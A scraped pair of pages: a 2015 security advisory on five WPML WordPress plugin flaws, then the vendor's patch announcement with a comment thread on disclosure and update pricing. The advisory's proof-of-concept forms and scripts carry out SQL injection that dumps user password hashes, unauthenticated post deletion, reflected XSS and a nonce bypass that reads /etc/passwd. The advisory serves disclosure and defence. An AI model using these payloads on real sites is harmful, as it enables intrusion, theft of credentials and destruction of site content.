=== Content from klikki.fi_f2e63081_20250125_021700.html ===

[Skip to content](#content)
 Klikki Tmi

![mobile](https://klikki.fi/wp-content/themes/fast-press/images/mobile.jpg)

Search for:
Search for:

X

Menu

Search for:
Search for:

X

# WPML vulnerabilities

**Update March 13:** Added vulnerability #4, unauthenticated administrative functions.

**Update April 12:** Added vulnerability #5, reflected XSS via HTTP referer.

**March 19:**See also [Google Analytics by Yoast](/adv/yoast_analytics.html) unauthenticated stored XSS (includes a YouTube demo).

### Overview

[WPML](http://wpml.org/) is the industry standard for creating multi-lingual WordPress sites. Several vulnerabilities were found in the plug-in. The most serious of them, an SQL injection problem, allows anyone to read the contents of the WordPress database, including user details and password hashes, without authentication.

System administrators should update to version 3.1.9 [released earlier this week](http://wpml.org/2015/03/wpml-security-update-bug-and-fix/) to resolve the issues.

### Details

#### 1. SQL injection

When WPML processed a HTTP POST request containing the parameter ”action=wp-link-ajax”, the current language is determined by parsing the HTTP referer. The parsed language code is not checked for validity, nor SQL-escaped. The user doesn’t need to be logged in.

By sending a carefully crafted referer value with the mentioned POST request parameter, an attacker can perform SQL queries on arbitrary tables and retrieve their results. In addition to the standard WordPress database and tables, the attacker may query all other databases and tables accessible to the web backend.

The following HTML snippet demonstrates the vulnerability:

```
<script>
var union="select user_login,1,user_email,2,3,4,5,6,user_pass,7,8,9,10,11,12 from wp_users";
if (document.location.search.length < 2)
        document.location.search="lang=xx' UNION "+union+" -- -- ";
</script>
<form method=POST action="https://YOUR.WORDPRESS.BLOG/comments/feed">
<input type=hidden name=action value="wp-link-ajax">
<input type=submit>
</form>

```

The results of the SQL query will be shown in the comments feed XML-formatted.

#### 2. Page/post/menu deletion

WPML contains a ”menu sync” function which helps site administrators to keep WordPress menus consistent across different languages. This functionality lacked any access control, allowing anyone to delete practically all content of the website – posts, pages, and menus.

Example:

```
<form method=POST action="https://YOUR.WORDPRESS.BLOG/?page=sitepress-multilingual-cms/menu/menus-sync.php">
<input type=hidden name="action" value="icl_msync_confirm">
<input type=text name="sync" size=50 value="del[x][y][12345]=z">
<input type=submit>
</form>

```

Submitting the above form would delete the row with the ID 12345 in the wp\_posts database. Several items can be deleted with the same request.

#### 3. Reflected XSS

The ”reminder popup” code intended for administrators in WPML didn’t check for login status or nonce. An attacker can direct target users to an URL like:

```
<https://YOUR.WORDPRESS.BLOG/?icl_action=reminder_popup&target=javascript%3aalert%28%2fhello+world%2f%29%3b%2f%2f>
```

to execute JavaScript in their browser. This example bypasses the Chrome XSS Auditor.

In the case of WordPress, XSS triggered by an administrator can lead to server-side compromise via the plugin and theme editors.

#### 4. Unauthenticated administrative functions

An unauthenticated attacker may bypass WPML’s nonce check and perform administrative functions.

The administrative ajax functions are protected with nonces to prevent unauthorized use. If the nonce check failed with $\_REQUEST values, there was a secondary check that also had to fail before the request was denied:

```
if (!( isset( $_GET[ 'icl_ajx_action' ] ) && $_GET[ 'nonce' ] == wp_create_nonce( $_GET[ 'icl_ajx_action' ] ) )) {
        die('Invalid nonce');
}

```

The problem is the mixed use of $\_REQUEST and $\_GET. If the above check succeeds, subsequent code again uses $\_REQUEST instead of $\_GET to determine the ajax action to perform.

If the attacker has a valid nonce generated by the target WordPress site – any plug-in or the core system – then they can pass the above check. They can then define a *different* ajax action in POST parameters to perform administrative functions without authentication.

An unauthenticated attacker could then execute any of the about 50 WPML ajax actions intended for administrators only. There is a lot of choice for manipulating or destroying data. For instance, it’s possible to define a root html file which is evaluated as

```
include $html_file;

```

This would allow reading server-side files or evaluating PHP code hosted on remote sites (if allowed by PHP settings).

A default WordPress installation with only WPML installed apparently doesn’t generate nonces for unauthenticated users, so this is probably not exploitable unless there are other plug-ins installed or the user can login. For example **bbpress** generates nonces for unauthenticated users.

Proof of concept:

```
<form method=POST action="https://YOUR.WORDPRESS.BLOG/?icl_ajx_action=toggle-subscription_10&nonce=1234567890">
<input type=hidden name="icl_ajx_action" value="icl_save_language_negotiation_type">
<input type=hidden name="_icl_nonce" value="(ignored)">
<input type=hidden name="icl_language_negotiation_type" value="1">
<input type=hidden name="use_directory" value="1">
<input type=hidden name="show_on_root" value="html_file">
<input type=hidden name="root_html_file_path" value="/etc/passwd">
<input type=submit>
</form>

```

In the above example, a toggle-subscription nonce generated by **bbpress** is used. It can be retrieved by unauthenticated users (go to a forum page, view source). On submitting the form, WPML will pass the ajax action because the **bbpress** nonce is valid.

The ajax action is determined from the POST parameters. In this example, the settings would be changed so that contents of */etc/passwd* would be shown as the default page on the website.

This PoC was successfully tested with WPML 3.1.7.2.

#### 5. Reflected XSS via HTTP referer

A POST request with the parameter “action=sample-permalink” produces HTML generated from the HTTP referer header. Posting the form from a carefully formatted referer URL produces a reflected XSS. This attack bypasses the XSS Auditor.

```
<script>
var inject='<script>alert("hello");</'+'script>';
var query='?lang=en">'+inject;
if (document.location.search.length<2)
        document.location.search=query;
</script>
<form method=POST action="https://YOUR.BLOG/">
<input type=hidden name="action" value="sample-permalink">
<input type=submit>
</form>

```
### Credits

The vulnerabilities were found by Jouko Pynnonen of [Klikki Oy](https://klikki.fi) while researching WordPress plugins falling in the scope of the [Facebook bug bounty](https://www.facebook.com/whitehat) program.

The vendor was notified on March 2, 2015 and the patch was released on March 10.

 [March 12, 2015February 3, 2023](https://klikki.fi/wpml-vulnerabilities/)  [klikki](https://klikki.fi/author/klikki/)
 [security](https://klikki.fi/category/security/) [bug bounty](https://klikki.fi/tag/bug-bounty/), [wordpress](https://klikki.fi/tag/wordpress/)

 [Previous](https://klikki.fi/wordpress-comment-exploit-published/)
[Next](https://klikki.fi/google-analytics-by-yoast-stored-xss/)

SearchSearch

* [media](https://klikki.fi/category/media/)
* [security](https://klikki.fi/category/security/)

* [Kiekko.tk](https://kiekko.tv)
* [TyperA](https://typera.net)
* [EverQuest Online Adventures](https://eqoa.live)

* jouko@iki.fi
* [HackerOne](https://hackerone.com/jouko)
* [Twitter](https://twitter.com/klikkioy)

[Powered by WordPress](https://wordpress.org/)

All rights reserved © Klikki
[Fast Press Theme by Seos Themes](https://seosthemes.com/ "Seos Theme - Fast Press")



=== Content from wpml.org_19947dbd_20250125_021708.html ===

[Skip Navigation](#content)

* [![English](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/en.svg)](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Spanish](data:image/svg+xml...)![Spanish](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/es.svg)](https://wpml.org/es/versiones-wpml-es/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![German](data:image/svg+xml...)![German](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/de.svg)](https://wpml.org/de/wpml-versionen-de/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![French](data:image/svg+xml...)![French](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/fr.svg)](https://wpml.org/fr/version-de-wpml-fr/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Portuguese (Brazil)](data:image/svg+xml...)![Portuguese (Brazil)](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/pt-br.svg)](https://wpml.org/pt-br/versoes-do-wpml-pt-br/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Japanese](data:image/svg+xml...)![Japanese](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ja.svg)](https://wpml.org/ja/wpml-%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3-ja/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Russian](data:image/svg+xml...)![Russian](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ru.svg)](https://wpml.org/ru/%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%B8-wpml-ru/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Chinese (Simplified)](data:image/svg+xml...)![Chinese (Simplified)](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/zh-hans.svg)](https://wpml.org/zh-hans/wpml%E7%89%88%E6%9C%AC/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Italian](data:image/svg+xml...)![Italian](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/it.svg)](https://wpml.org/it/versioni-di-wpml-it/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Hebrew](data:image/svg+xml...)![Hebrew](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/he.svg)](https://wpml.org/he/%D7%92%D7%A8%D7%A1%D7%90%D7%95%D7%AA-wpml-he/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Arabic](data:image/svg+xml...)![Arabic](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ar.svg)](https://wpml.org/ar/%D8%A5%D8%B5%D8%AF%D8%A7%D8%B1%D8%A7%D8%AA-wpml-ar/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Korean](data:image/svg+xml...)![Korean](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/ko.svg)](https://wpml.org/ko/wpml-%EB%B2%84%EC%A0%84/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Thai](data:image/svg+xml...)![Thai](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/th.svg)](https://wpml.org/th/%E0%B9%80%E0%B8%A7%E0%B8%AD%E0%B8%A3%E0%B9%8C%E0%B8%8A%E0%B8%B1%E0%B8%99-wpml/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")
  + [![Vietnamese](data:image/svg+xml...)![Vietnamese](https://cdn.wpml.org/wp-content/plugins/sitepress-multilingual-cms/res/flags/vi.svg)](https://wpml.org/vi/phien-ban-wpml/2015/03/wpml-security-update-bug-and-fix/ "Switch to ")

* [Log In](https://wpml.org/account/)

[![WPML - ](https://cdn.wpml.org/wp-content/themes/sitepress/images/svg/logo-wpml-otgs.svg)](https://wpml.org/)

* [Home](https://wpml.org/)
  + [About WPML](https://wpml.org/home/about-us/)
  + [WPML’s Minimum Requirements](https://wpml.org/home/minimum-requirements/)
  + [Comparing WPML to Free and Paid Alternatives](https://wpml.org/home/comparing-wpml-free-paid-alternatives/)
  + [WPML Showcase](https://wpml.org/showcase/)
  + [How to Translate Your WordPress Website in 2024](https://wpml.org/home/how-to-build-a-multilingual-wordpress-website/)
  + [Resources for Bloggers and Affiliates](https://wpml.org/home/blogger-resources/)
  + [Testimonials](https://wpml.org/testimonial/)
  + [Join Our Team](https://onthegosystems.com/jobs/)
  + [Contact Us](https://wpml.org/home/contact-us/)
* [Features](https://wpml.org/features/)
* [Purchase](https://wpml.org/purchase/)
  + [WPML Pricing](https://wpml.org/purchase/)
  + [WPML Support Policy](https://wpml.org/purchase/support-policy/)
  + [Refunds](https://wpml.org/purchase/refunds/)
  + [Purchase Process](https://wpml.org/purchase/purchase-process/)
  + [Pre-sales Questions](https://wpml.org/purchase/pre-sales-questions/)
* [Documentation](https://wpml.org/documentation/)
  + [Getting Started Guide](https://wpml.org/documentation/getting-started-guide/)
  + [WPML Core and Add-on Plugins](https://wpml.org/documentation/wpml-core-and-add-on-plugins/)
  + [WooCommerce Multilingual](https://wpml.org/documentation/related-projects/woocommerce-multilingual/ "WooCommerce Multilingual – Run E-Commerce Sites in Several Languages")
  + [Recommended Themes for Multilingual Sites](https://wpml.org/theme/)
  + [Recommended Plugins for Multilingual Sites](https://wpml.org/plugin/)
  + [Automatic Translation for WordPress Sites with WPML](https://wpml.org/documentation/automatic-translation/)
  + [WPML AI – Translate WordPress with ChatGPT](https://wpml.org/documentation/automatic-translation/wpml-ai-wordpress-translation/)
  + [Translation Services for WordPress Websites](https://wpml.org/translation-service/)
  + [FAQs](/faq/)
  + [Developers Information](https://wpml.org/documentation/support/)
* [Support](/forums/forum/english-support/)
  + [Ask a support question](/forums/forum/english-support/)
  + [Hire developers for multilingual sites](https://wpml.org/contractors/)
  + [Certified Reviewers for Automatic Translation](https://wpml.org/translation-reviewer/)
  + [Meet our supporters](https://wpml.org/forums/supporters/)
* [Blog](https://wpml.org/blog/)
  + [Announcements](https://wpml.org/category/announcements/)
  + [WPML versions](https://wpml.org/category/changelog/)
  + [Compatibility](https://wpml.org/category/compatibility/)
  + [Tutorials](https://wpml.org/category/tutorials/)
  + [Others writing about WPML](https://wpml.org/mention/)

 [Home](https://wpml.org/) » [WPML Blog – News and Updates for the WordPress Multilingual Plugin](https://wpml.org/blog/) » [WPML versions](https://wpml.org/category/changelog/) » WPML Security Update, Bug and Fix
# WPML Security Update, Bug and Fix

![](data:image/svg+xml...)
[WPML versions](https://wpml.org/category/changelog/)

March 11th, 2015
[36](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comments)

Yesterday we released WPML 3.1.9, which addresses several security concerns. We take the security of our clients very seriously, so as soon as we noticed these possible exploits, we set to work on a version which fixes them. That version added sanitation to a number of places in the code. One of them, sanitized URLs incorrectly, ending up in a bug that caused WPML not to decode non-English URLs correctly.

So, if you updated WPML to 3.1.9 and got a 404 error, please note that you’re not alone. We had it for several hours on our own sites too.

[![URL resolution bug with WPML 3.1.9](https://cdn.wpml.org/wp-content/uploads/2015/03/wpml319-bug-non-english-chars-300x183.png)](https://cdn.wpml.org/wp-content/uploads/2015/03/wpml319-bug-non-english-chars.png)

URL resolution bug with WPML 3.1.9

We had to balance between the urgency of fixing a security issue and the time it takes to test every feature in WPML. In this case, we didn’t catch the problem and release a version that fixes the security issues but causes the problem.

It’s fixed now in 3.1.9.1. We are very sorry for the trouble that this had caused. Please note that this was a ‘render’ issue only. Meaning, nothing got changed in your database and content is still there.

[![Back to normal with WPML 3.1.9.1](https://cdn.wpml.org/wp-content/uploads/2015/03/wpml3191-ok-300x253.png)](https://cdn.wpml.org/wp-content/uploads/2015/03/wpml3191-ok.png)

Back to normal with WPML 3.1.9.1

Please be sure to update to the recent version of WPML. Don’t let this glitch keep you from updating, so that you have the most recent and secure version of WPML.

After upgrading, we encourage you to register your site on wpml.org. You can register as many sites as you need, for yourself and for your clients. This registration tells us which versions run where. We are going to use it to contact clients who have out-of-date versions of WPML and advise to upgrade sites, which you might have forgotten about.

Questions? Ideas? Suggestions? Let us know by leaving your comments.

### 36 Responses to “WPML Security Update, Bug and Fix”

1. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/600ad4f0394f7d7e698880b4387ca5d6?s=60&d=mm&r=g) **Rob the angyr coder** says:
   [March 11, 2015 at 3:05 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350199)

   Well, one suggestion would be to learn how to write proper changelogs, create something similar to <https://cve.mitre.org/> so we can mitigate any security issues and write tests for them where we use WPML.

   When you write shit like “As with any security update, we will skip the detailed description of the security improvements. We would like to emphasize the importance of updating WPML on your sites and all your client sites ASAP.” we can’t judge anything from that, and it will not protect the innocent at all. The people writing exploits already know the bugs, but we the people that are trying to defend our systems can’t know without starting diffing and screwing around with the code to figure out what the hell you did and why you did it.

   Are there remote execution sploits? Do you need admin for it? Which versions are affected? So many questions, no answers…

   Security by obscurity is \*WORSE\* than no security at all. In complicated setups where we need to plan downtime and maintenance windows this is a nightmare.

   We need the information so we can mitigate it and detected it, and write rules in our WAF’s and other security solutions and make it part of the security pentest suite that we use, so we \*KNOW\* that it does not happen again.

   * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
     [March 11, 2015 at 8:52 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350379)

     We write detailed changelogs for everything except exploits. Obviously, our sites are all updated, but not all clients managed to update their sites yet. I don’t think that it’s fair to describe how to hack into people’s sites, no matter if they are our clients or not.

     + ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/dedb6e2e2f305a23690512819c511637?s=60&d=mm&r=g) **koenD** says:
       [March 13, 2015 at 8:19 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1351015)

       I agree with Rob.

       And Amir, I think WPML is being naive.

       What do you think hackers will do when there is no changelog? Compare code and figure out how to exploit it. Hackers don’t need a changelog for that.

       This is how you should address security issues: <https://yoast.com/wordpress-seo-security-release/>

       Just tell site admins what they are dealing with.

       - ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
         [March 16, 2015 at 11:49 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352084)

         We see our responsibility extending beyond releasing a security update. We want to make sure that:

         1) Everyone updated and is secure

         2) People don’t have problems with their sites (security or otherwise)

         Fortunately, we have the mechanism to see which sites still require updates. We are sending email reminders to their webmasters. As soon as we see that all, or almost all, sites are up-to-date and secure, we can explain what the exploits were.

         I don’t think that people would be very happy to see this update from us, not manage to install it and see an explanation, on our own site, how to exploit their sites.

         Some people reacted very quickly to this update, but it’s taking longer for others. We know that not every person is immediately accessible or available, so we don’t want to disclose the technical details before everyone had a chance to update.

         I’d like to be responsible for our policy and I leave others to be responsible for their policies.

         Does this sound fair?

         * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/1844c0622dc5e2e2b69c91349483a4ab?s=60&d=mm&r=g) **Jeff McNeill** says:
           [March 17, 2015 at 1:32 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352451)

           The emails are really not very helpful, just more nonsense. If there was an automated way to update WPML, such as clicking an UPDATE button, that would be helpful. Why do I need an installation tutorial?

           Looks like your security update broke lots of sites, because it wasn’t tested. Availability and access are aspects of security as well. Really disappointed in how WPML handles updates, security, changelogs, and not taking responsibility. You need a security officer.

           + ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
             [March 17, 2015 at 8:00 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352562)

             WPML has an automated update process. Once you do the one-time registration, your site will receive automatic updates to all of WPML components. You can get these updates either via the Plugins admin screen or via the Dashboard->Updates menu. This is the same workflow for getting updates as for all plugins coming from the WordPress plugins repository. Our installation FAQ explains how to do the initial installation and registration. After that, you receive updates automatically.

             Are you having any sort of issues on your sites with the recent version of WPML? If so, please let me know about it, so that we can help you. Currently, there are many thousands of sites running the recent version and we haven’t received reports of problems with it.

             - ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/1844c0622dc5e2e2b69c91349483a4ab?s=60&d=mm&r=g) **jeffmcneill** says:
               [March 17, 2015 at 8:17 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352574)

               There are so many issues with this response:

               1. You HAVE received reports of problems with sites with non-latin character urls. That is listed on this page already.

               2. Having automated update that cannot be controlled by website admins is a huge error. I’ve looked into this on your discussion forums and I am appalled by this and have unregistered all my sites.

               3. Your update system is completely outside of the WordPress plugin update system, which is completely unnecessary, and a huge security issue, not to mention getting updates that break sites.

               4. The email I received says that 3.1.9.3 is the latest, but my sites only update to 3.1.9 and there is now way I can force that process? Looking here: <http://wpml.org/faq/install-wpml/> it appears I have to register a site key, manually download the system, then de-register the site key each time I want to update. That’s just crazy.

               I feel that I’ve made a huge mistake by purchasing and installing WPML.

               * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
                 [March 18, 2015 at 8:51 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1353571)

                 There might be some misunderstanding here.

                 WPML uses the WordPress updates system, as it is. We think that it’s a pretty good system.

                 That system allows us to hook and change the source of plugins. We use it to send updates from wpml.org, rather than from wordpress.org. The rest of the workflow comes from WordPress core.

                 We don’t force updates. We signal to WordPress than an update is available. Then, it’s displayed as a notification to the user, who can click on the update button. There is a discussion in WordPress core about making plugin updates automatic. Whatever they will decide will happen, but we don’t change that mechanism. Currently, in WordPress 4.1.1, WPML updates are available and require action to apply.

                 The manual download needs to be done ONCE. After you do this and register, you receive automated updates, as explained above. Some sites haven’t registered for automatic updates (like your sites now), so our FAQ explains how to do this registration and receive future updates automatically.

                 Does this help? If you are seeing anything different, please let us know.
               * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/1844c0622dc5e2e2b69c91349483a4ab?s=60&d=mm&r=g) **jeffmcneill** says:
                 [March 19, 2015 at 3:35 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1353679)

                 You are wrong. (your message below, as the thread reply limit has been reached in terms of replies to replies). See this thread for more info: <https://wpml.org/forums/topic/please-specify-a-way-to-disable-wpml-updates-beside-unregistering-the-site/>
     + ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/3abadbd65e1df38258c1a023b622d88a?s=60&d=mm&r=g) **[Leo](http://www.techgarage.my)** says:
       [March 13, 2015 at 1:52 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1351199)

       Thanks Amir 🙂 Has the performance improvements been included yet? Appreciate the fact that exploits aren’t published, as some might not update their sites on time 🙂

       - ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
         [March 16, 2015 at 11:38 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352072)

         This update only handles the security issues. We had to push it without delay and didn’t want to bundle other changes which may cause new issues and require longer testing. Right now, we are back to WPML 3.2, which includes:

         \* Fixes for corner cases

         \* Better performance, especially around string translation

         \* Connection to other translation services

         We’re doing our best to complete this together with WordPress 4.2, so that we don’t have to release another intermediary version for WP 4.2 changes.
3. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/abda9e3b2801b672b9e8141299e16b8f?s=60&d=mm&r=g) **[Rainer](http://www.augsburg-webdesign.com)** says:
   [March 11, 2015 at 8:30 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350370)

   I have big trouble with my customer and his small onlineshop <http://www.mr-verlag.de>.

   But I hope the problem is fixed now.

   * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
     [March 11, 2015 at 8:50 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350376)

     Could you tel us what the problem is, so we can help you? Best is to open a thread in our technical forum. After you do this, please paste the link here, so that I can follow up and see that it’s handled correctly.
   * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/de5a890275317d925494c33fd97a722e?s=60&d=mm&r=g) **Agnes Bury** says:
     [March 12, 2015 at 7:49 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350491)

     This is something that our support team is best fit to answer. Have you asked in our technical support forum? When you do that, please be sure to explain how you’re handling the e-commerce in your site (plugin / theme).
5. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/abda9e3b2801b672b9e8141299e16b8f?s=60&d=mm&r=g) **[Rainer](http://www.augsburg-webdesign.com)** says:
   [March 11, 2015 at 8:45 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350375)

   … not fixed!
7. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/a25780b61019a150c4d1afb1b5558cf4?s=60&d=mm&r=g) **Shane** says:
   [March 12, 2015 at 1:10 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350694)

   I tried the new WPML 3.1.9.2 update out on localhost (luckly) before updating on the production site <http://kalao-design.com>. This update breaks the site, leaving only a white screen!!! I had to manually, delete the plugin and reinstall WPML 3.1.8.6 to get it working again.

   * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
     [March 12, 2015 at 4:21 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350795)

     Andrea, lead developer of WPML is handling this. If there’s still an unresolved problem, please start a new thread in our technical support forum. A WSOD can come from many things (including memory overflow, etc.). When you open a support thread, please be sure to enable error logging and tell us what you see in the PHP error log. This will immediately indicate the source of the problem and we can handle it.

     See here for how to enable error logging:

     <http://wpml.org/documentation/support/debugging-wpml/>

     If you create a support thread with this info, please add another message here with the link to that thread, so we can follow up closely.
9. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/8f58d7a3a3b78d225af523dcb9f8cc83?s=60&d=mm&r=g) **garyw-2** says:
   [March 12, 2015 at 3:34 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350773)

   Any update on what the following 3 updates do?

   * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
     [March 12, 2015 at 4:18 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1350794)

     A series of fixes all revolving around cases of sites that have URLs with non-English characters. We’re sorry that it took several iterations to catch all these. Before SQL statements were escaped, everything worked fine, but could be potentially exploited (not so easily though). Escaping had its interactions with different server setups, so that opened a good number of corner cases that escaped our testing.

     The critical update was to 3.1.9. If your site uses non English characters in URLs, you may have some 404 errors instead of content, which the subsequent updates fix.

     Normally, this would not be our release process. Before updating WPML, we would run full QA that would find these problems. Since it was an urgent update (to respond in a timely manner to a security report), we didn’t want to delay for 3 weeks with the complete QA. For now, it appears that everyone is OK.

     Just for the record, the unfortunate bug with non-English URLs affected our sites too, so you’re not alone 🙂
11. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/5c487e04c562aaa0087dff1dea48c986?s=60&d=mm&r=g) **[Hadorn](http://www.hadornag.ch)** says:
    [March 13, 2015 at 12:05 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1351129)

    Thanks for this statement, Amir. We did go through quite some trouble with this update on several client sites. Your post helps us to understand why you have released this update with such urgency. I agree with Rob though that more detailed information on the security issues would be very helpful.

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [March 16, 2015 at 11:39 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352075)

      We’ll publish that more detailed information, as soon as we see that almost everyone updated their sites. The registration process in WPML allows us to see who’s using which version. I’m sending out reminder emails today encouraging everyone to update as soon as possible. When we see that almost all sites are up-to-date (hopefully, all), we will explain in more detail the security improvements.
13. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/5de31b568ddb15816190784bc0aeb5e6?s=60&d=mm&r=g) **[Demarteau](http://www.homeogenium.com/wordpress/)** says:
    [March 17, 2015 at 8:22 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1352577)

    Hi

    I’ve registered WPML since the beginning (December 1, 2014) and everything is going well

    I’m not able to find the update button in the update dashboard panel

    So how can I update without the risk to loose every translation

    Thanks for response

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [March 18, 2015 at 8:53 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1353572)

      When you go to Dashboard->Updates, you will find a button labelled ‘Check for updates’. Click on it, for WordPress to check available updates. WPML updates will only appear if you have registered WPML on your site. We explain the registration mechanism here:

      <http://wpml.org/faq/install-wpml/>

      You can register WPML on all your sites and sites that you build for your clients.

      Does this help?
15. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/f801a1b04bc9572328f45d27d0e415c4?s=60&d=mm&r=g) **[Ariel](http://isawthat.com)** says:
    [March 19, 2015 at 1:39 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1353971)

    I’m running 2.3.4 — am I affected? Please don’t tell me to upgrade; I cannot afford yearly subscriptions.

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [March 22, 2015 at 1:36 pm](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1355178)

      You should update to the current version, to avoid security exploits. We created a special discount for folks who have expired accounts, so that this and future upgrades are available:

      <https://wpml.org/2015/03/special-discount-for-expired-wpml-accounts-to-access-security-updates/>
17. ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/b8e8796f67ed40fd8d46694dd58fea1d?s=60&d=mm&r=g) **Jose Luis** says:
    [March 23, 2015 at 10:32 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1355493)

    Having such expensive yearly subscriptions is the main reason why we changed to other translation plugins but expecting people to pay for upgrades to fix sever security issues should simply be illegal.

    When I bought your plugin I assumed no new features after subscription ended, but never that if the code was simply “faulty” you would just leave everyone stack on their own. This is a bad policy that will turn against you in the long term.

    * ![](data:image/svg+xml...)![](https://secure.gravatar.com/avatar/c12fddc409680bec9036c4f57287ce79?s=60&d=mm&r=g) **Amir** says:
      [March 23, 2015 at 10:57 am](https://wpml.org/changelog/2015/03/wpml-security-update-bug-and-fix/#comment-1355509)

      Hi Jose,

      I understand that it’s frustrating to have to pay for updates because of a change that you didn’t ask for. We want to make sure that this update is accessible to as many people as possible. This is why we’ve established a drastic discount for expired accounts:

      <https://wpml.org/2015/03/special-discount-for-expired-wpml-accounts-to-access-security-updates/>

      The blog post also explains the rational behind it and how it works.
